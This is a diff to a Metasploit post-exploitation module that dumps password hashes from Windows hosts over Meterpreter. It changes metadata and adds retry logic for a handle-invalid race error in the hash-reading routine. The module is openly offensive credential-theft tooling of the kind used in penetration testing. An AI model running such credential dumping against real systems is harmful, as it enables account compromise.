@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -16,6 +12,7 @@ require 'msf/core/post/windows/priv'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/accounts'
 require 'msf/core/post/file'
+require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 
@@ -36,8 +33,7 @@ class Metasploit3 < Msf::Post
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
+				'Platform'      => [ 'win' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
 		register_options(
@@ -288,6 +284,8 @@ class Metasploit3 < Msf::Post
 	def read_hashdump
 		host,port = session.session_host, session.session_port
 		collected_hashes = ""
+		tries = 1
+
 		begin
 
 			print_status("\tObtaining the boot key...")
@@ -333,8 +331,19 @@ class Metasploit3 < Msf::Post
 		rescue ::Interrupt
 			raise $!
 		rescue ::Rex::Post::Meterpreter::RequestError => e
-			print_error("Meterpreter Exception: #{e.class} #{e}")
-			print_error("This module requires the use of a SYSTEM user context (hint: migrate into service process)")
+			# Sometimes we get this invalid handle race condition.
+			# So let's retry a couple of times before giving up.
+			# See bug #6815
+			if tries < 5 and e.to_s =~ /The handle is invalid/
+				print_status("Handle is invalid, retrying...")
+				tries += 1
+				retry
+
+			else
+				print_error("Meterpreter Exception: #{e.class} #{e}")
+				print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
+			end
+
 		rescue ::Exception => e
 			print_error("Error: #{e.class} #{e} #{e.backtrace}")
 		end
